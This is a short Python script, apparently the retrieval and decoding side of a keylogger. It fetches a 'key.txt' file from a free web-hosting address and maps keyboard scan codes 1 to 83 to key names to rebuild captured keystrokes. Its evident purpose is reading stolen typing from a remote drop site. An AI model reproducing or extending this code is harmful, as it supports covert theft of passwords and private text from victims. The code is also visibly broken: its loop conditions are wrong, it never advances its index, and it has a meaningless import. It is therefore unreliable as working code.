from asyncio.windows_events import NULL
import urllib.request
from datetime import datetime
test = urllib.request.urlopen(f'https://anerol.000webhostapp.com/index.html/key.txt')
for line in test:
       line = str(line)
       line = line.replace('b','')
       line = line.replace("'",'')
       print(line)
       i = 0
       nr = ""
       key = ""
       while i in line:
              while line[i] != ".":
                     nr += line[i]               
              if nr == "1":
                     key = "ESC"
              elif nr == "2":
                     key = "1"
              elif nr == "3":
                     key = "2"
              elif nr == "4":
                     key = "3"
              elif nr == "5":
                     key = "4"
              elif nr == "6":
                     key = "5"
              elif nr == "7":
                     key = "6"
              elif nr == "8":
                     key = "7"              
              elif nr == "9":
                     key = "8"
              elif nr == "10":
                     key = "9"
              elif nr == "11":
                     key = "0"
              elif nr == "12":
                     key = "-"
              elif nr == "13":
                     key = "="
              elif nr == "14":
                     key = "[BACK]"
              elif nr == "15":
                     key = "[TAB]"
              elif nr == "16":
                     key = "q"
              elif nr == "17":
                     key = "w"
              elif nr == "18":
                     key = "e"
              elif nr == "19":
                     key = "r"
              elif nr == "20":
                     key = "t"
              elif nr == "21":
                     key = "y"
              elif nr == "22":
                     key = "u"
              elif nr == "23":
                     key = "i"
              elif nr == "24":
                     key = "o"
              elif nr == "25":
                     key = "p"
              elif nr == "26":
                     key = "["
              elif nr == "27":
                     key = "]"
              elif nr == "28":
                     key = "[ENTER]"
              elif nr == "29":
                     key = "[CTRL]"
              elif nr == "30":
                     key = "a"
              elif nr == "31":
                     key = "s"
              elif nr == "32":
                     key = "d"
              elif nr == "33":
                     key = "f"
              elif nr == "34":
                     key = "g"
              elif nr == "35":
                     key = "h"
              elif nr == "36":
                     key = "j"
              elif nr == "37":
                     key = "k"
              elif nr == "38":
                     key = "l"
              elif nr == "39":
                     key = ";"
              elif nr == "40":
                     key = "'"
              elif nr == "41":
                     key = "`"
              elif nr == "42":
                     key = "[LSHIFT]"
              elif nr == "43":
                     key = "\\"
              elif nr == "44":
                     key = "z"
              elif nr == "45":
                     key = "x"
              elif nr == "46":
                     key = "c"
              elif nr == "47":
                     key = "v"
              elif nr == "48":
                     key = "b"
              elif nr == "49":
                     key = "n"
              elif nr == "50":
                     key = "m"
              elif nr == "51":
                     key = ","
              elif nr == "52":
                     key = "."
              elif nr == "53":
                     key = "/"
              elif nr == "54":
                     key = "[RSHIFT]"
              elif nr == "55":
                     key = "[PRTSC]"
              elif nr == "56":
                     key = "[ALT]"
              elif nr == "57":
                     key = "[SPACE]"
              elif nr == "58":
                     key = "[CAPS]"
              elif nr == "59":
                     key = "[F1]"
              elif nr == "60":
                     key = "[F2]"
              elif nr == "61":
                     key = "[F3]"
              elif nr == "62":
                     key = "[F4]"
              elif nr == "63":
                     key = "[F5]"
              elif nr == "64":
                     key = "[F6]"
              elif nr == "65":
                     key = "[F7]"       
              elif nr == "66":
                     key = "[F8]"
              elif nr == "67":
                     key = "[F9]"
              elif nr == "68":
                     key = "[F10]"
              elif nr == "69":
                     key = "[NUM]"
              elif nr == "70":
                     key = "[SCROLL]"
              elif nr == "71":
                     key = "[HOME(7)]"
              elif nr == "72":
                     key = "[UP(8)]"
              elif nr == "73":
                     key = "[PGUP(9)]"
              elif nr == "74":
                     key = "-"
              elif nr == "75":
                     key = "[LEFT(4)]"
              elif nr == "76":
                     key = "[CENTER(5)]"
              elif nr == "77":
                     key = "[RIGHT(6)]"
              elif nr == "78":
                     key = "+"
              elif nr == "79":
                     key = "[END(1)]"
              elif nr == "80":
                     key = "[DOWN(2)]"
              elif nr == "81":
                     key = "[PGDN(3)]"
              elif nr == "82":
                     key = "[INS]"
              elif nr == "83":
                     key = "[DEL]"
              else:
                 print(key)
                 nr = ""
              i += 1



       #print(line)
